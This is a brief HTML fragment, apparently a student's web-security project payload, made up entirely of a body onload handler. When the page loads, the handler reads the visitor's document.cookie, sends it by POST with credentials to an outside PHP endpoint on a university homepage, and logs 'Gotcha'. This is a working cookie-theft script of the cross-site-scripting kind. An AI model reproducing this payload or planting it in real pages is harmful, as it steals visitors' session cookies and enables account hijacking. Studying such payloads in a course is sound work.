   <body onload = "javascript:fetch('https://homes.cs.washington.edu/~gaos23/p2/p2.php?cookie='+document.cookie, {
                     method: 'POST',
                                   credentials: 'include'
                                           })
             .then((response) => response.json())
                      .then((json) => {
                                           console.log('Gotcha');
                                                              })">


 </body>
